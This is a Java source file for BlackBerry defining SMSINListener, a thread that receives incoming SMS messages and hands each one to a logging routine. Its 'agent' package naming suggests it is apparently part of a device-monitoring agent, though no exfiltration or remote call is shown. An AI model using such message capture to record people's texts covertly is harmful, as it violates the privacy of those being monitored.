package blackberry.agent.sms;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.mail.Message;
import net.rim.device.api.util.DataBuffer;

import blackberry.agent.MessageAgent;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

/**
 * Dalla 4.7 implements SendListener
 * @author user1
 *
 */
class SMSINListener implements MessageListener, Runnable {

    // #debug
    static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);

    private int messages;
    private SmsListener smsListener;
    private MessageConnection conn;

    public SMSINListener(MessageConnection conn, SmsListener smsListener) {
        messages = 0;
        this.conn = conn;
        this.smsListener = smsListener;
    }

    public void run() {
        while (true) {
            while (messages > 0) {
                try {
                    javax.wireless.messaging.Message m = conn.receive();
                    
                    smsListener.saveLog(m, true);
                                      
                } catch (IOException e) {
                    e.printStackTrace();
                }
                messages--;
            }
            synchronized (this) {
                try {
                    wait();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public synchronized void notifyIncomingMessage(MessageConnection conn) {
        messages++;
        notifyAll();
    }
    

}
